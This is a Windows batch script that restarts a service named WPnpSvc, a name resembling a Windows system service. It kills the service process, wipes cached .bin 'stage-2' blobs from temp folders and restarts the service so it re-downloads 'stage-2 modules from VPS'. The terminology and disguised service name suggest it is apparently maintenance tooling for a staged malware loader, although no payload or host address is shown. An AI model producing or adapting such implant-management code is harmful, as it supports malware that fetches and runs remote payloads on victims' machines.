@echo off
rem Force fresh stage-2 blob fetch on next host run.
rem Useful after host_update from an older version left stale blobs
rem in the local pnp_cache.

echo Refreshing stage-2 blobs for WPnpSvc...
echo.

set SVC=WPnpSvc

echo [1/3] Stopping service...
set HOST_PID=
for /f "tokens=3" %%P in ('sc queryex %SVC% 2^>nul ^| findstr /i "PID"') do set HOST_PID=%%P
sc.exe stop %SVC% >nul 2>&1
timeout /t 3 /nobreak >nul 2>nul
if defined HOST_PID taskkill.exe /F /PID %HOST_PID% >nul 2>&1
timeout /t 1 /nobreak >nul 2>nul

echo [2/3] Wiping local blob cache...
del /f /q "%SystemRoot%\Temp\pnp_cache\*.bin" >nul 2>&1
del /f /q "%TEMP%\pnp_cache\*.bin" >nul 2>&1
rmdir /q "%SystemRoot%\Temp\pnp_cache" >nul 2>&1
rmdir /q "%TEMP%\pnp_cache" >nul 2>&1

echo [3/3] Starting service (will re-fetch all stage-2 modules from VPS)...
sc.exe start %SVC% >nul 2>&1
timeout /t 3 /nobreak >nul 2>nul
sc.exe query %SVC% | findstr /C:"RUNNING" >nul 2>&1
if %errorlevel%==0 (
    echo.
    echo [+] Service running. Stage-2 modules will prefetch from VPS in ~5 seconds.
) else (
    echo.
    echo [!] Service did not start cleanly. Check Event Viewer.
)
echo.
pause
